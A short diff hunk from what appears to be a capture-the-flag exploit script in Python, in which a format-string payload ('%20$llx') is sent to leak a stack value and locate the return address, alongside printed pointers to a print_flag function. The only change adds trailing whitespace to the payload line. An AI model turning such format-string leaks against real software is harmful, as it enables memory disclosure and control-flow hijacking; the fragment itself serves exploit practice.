@@ -126,7 +126,7 @@ print("Leaked pointer is: " + hex(ptr))
 print("Pointer to print_flag: " + hex(ptr_to_print_flag))
 
 # Find RIP location in stack by leaking RBP
-payload = b"%20$llx"
+payload = b"%20$llx"                
 io.sendline(payload)
 
 io.recvuntil(b'You heard in the distance: ')
